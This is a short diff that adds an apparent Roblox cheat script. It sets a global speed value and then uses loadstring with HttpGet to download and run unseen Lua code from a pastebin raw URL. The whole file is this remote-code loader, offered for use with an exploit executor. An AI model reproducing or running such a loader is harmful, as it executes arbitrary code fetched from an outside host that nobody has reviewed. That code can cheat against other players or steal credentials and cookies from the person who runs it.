@@ -1,0 +1,3 @@
+getgenv().speed = 200
+
+loadstring(game:HttpGet("https://pastebin.com/raw/fKwwyDMr"))()
